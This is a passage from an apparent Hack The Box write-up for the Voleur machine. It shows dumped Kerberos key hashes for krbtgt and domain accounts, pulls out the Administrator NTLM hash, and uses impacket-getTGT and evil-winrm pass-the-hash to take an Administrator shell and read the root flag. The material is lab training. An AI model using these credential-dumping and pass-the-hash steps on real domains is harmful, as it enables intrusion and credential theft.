DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7
DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782
DC$:des-cbc-md5:64e05b6d1abff1c8
krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145
krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211
krbtgt:des-cbc-md5:34ae31d073f86d20
voleur.htb\ryan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74
voleur.htb\ryan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1
voleur.htb\ryan.naylor:des-cbc-md5:4376f7917a197a5b
voleur.htb\marie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d
voleur.htb\marie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f
voleur.htb\marie.bryant:des-cbc-md5:cdf1492604d3a220
voleur.htb\lacey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9
voleur.htb\lacey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066
voleur.htb\lacey.miller:des-cbc-md5:6eef922076ba7675
voleur.htb\svc_ldap:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910
voleur.htb\svc_ldap:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f
voleur.htb\svc_ldap:des-cbc-md5:1ab0fbfeeaef5776
voleur.htb\svc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f
voleur.htb\svc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd
voleur.htb\svc_backup:des-cbc-md5:7ab513f8ab7f765e
voleur.htb\svc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258
voleur.htb\svc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395
voleur.htb\svc_iis:des-cbc-md5:70ce25431c577f92
voleur.htb\jeremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0
voleur.htb\jeremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27
voleur.htb\jeremy.combs:des-cbc-md5:192f702abff75257
voleur.htb\svc_winrm:aes256-cts-hmac-sha1-96:6285ca8b7770d08d625e437ee8a4e7ee6994eccc579276a24387470eaddce114
voleur.htb\svc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831
voleur.htb\svc_winrm:des-cbc-md5:32b61fb92a7010ab
[*] Cleaning up... 
```

From the secretsdump output, we extract the Administrator's NTLM hash:

```
aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2
```

The format is `LMhash:NThash`. Since modern Windows systems don't use LM hashes, the first part is typically the empty LM hash (`aad3b435b51404eeaad3b435b51404ee`), and the second part is the actual NTLM hash we need.

We can use this hash to obtain a Kerberos ticket for the Administrator account:

```bash
❯ impacket-getTGT VOLEUR.HTB/administrator -hashes aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2                                                                 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in administrator.ccache
```

We activate the ticket by setting the `KRB5CCNAME` environment variable:

```bash
❯ export KRB5CCNAME=administrator.ccache
```

Now we can log in as Administrator and retrieve the root flag

```bash
❯ evil-winrm -i dc.voleur.htb -r VOLEUR.HTB -u 'administrator' -H e656e07c56d831611b577b160b259ad2
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Warning: Password is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
<**REDACTED**>
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```